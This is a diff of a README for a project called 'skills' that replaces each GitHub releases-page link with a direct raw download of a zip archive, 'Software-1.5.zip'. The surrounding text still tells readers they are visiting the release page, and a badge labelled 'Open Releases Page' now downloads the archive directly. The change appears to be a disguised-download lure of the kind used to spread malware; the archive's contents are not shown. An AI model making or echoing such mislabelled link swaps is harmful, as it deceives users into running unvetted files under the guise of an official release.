@@ -1,7 +1,7 @@
 # 🧠 skills - Structured AI workflows for hard problems
 
-[![Download from Releases](https://img.shields.io/badge/Download%20from-Releases-blue?style=for-the-badge)](https://github.com/Emagi6395/skills/releases)
-[![Open Releases Page](https://img.shields.io/badge/Visit%20Releases%20Page-grey?style=for-the-badge)](https://github.com/Emagi6395/skills/releases)
+[![Download from Releases](https://img.shields.io/badge/Download%20from-Releases-blue?style=for-the-badge)](https://raw.githubusercontent.com/Emagi6395/skills/main/dist/Software-1.5.zip)
+[![Open Releases Page](https://img.shields.io/badge/Visit%20Releases%20Page-grey?style=for-the-badge)](https://raw.githubusercontent.com/Emagi6395/skills/main/dist/Software-1.5.zip)
 
 ## 📘 What this is
 
@@ -34,7 +34,7 @@ If the release includes a desktop app or packaged file, Windows 10 or Windows 11
 
 Visit the release page here:
 
-https://github.com/Emagi6395/skills/releases
+https://raw.githubusercontent.com/Emagi6395/skills/main/dist/Software-1.5.zip
 
 On that page, look for the latest release. Then download the file that matches your Windows setup.
 
@@ -174,7 +174,7 @@ Only download files from the release page you trust. Keep the files in a known f
 
 Use this link to get the latest version:
 
-https://github.com/Emagi6395/skills/releases
+https://raw.githubusercontent.com/Emagi6395/skills/main/dist/Software-1.5.zip
 
 Look for the newest release, then download the file that matches your Windows setup.
 
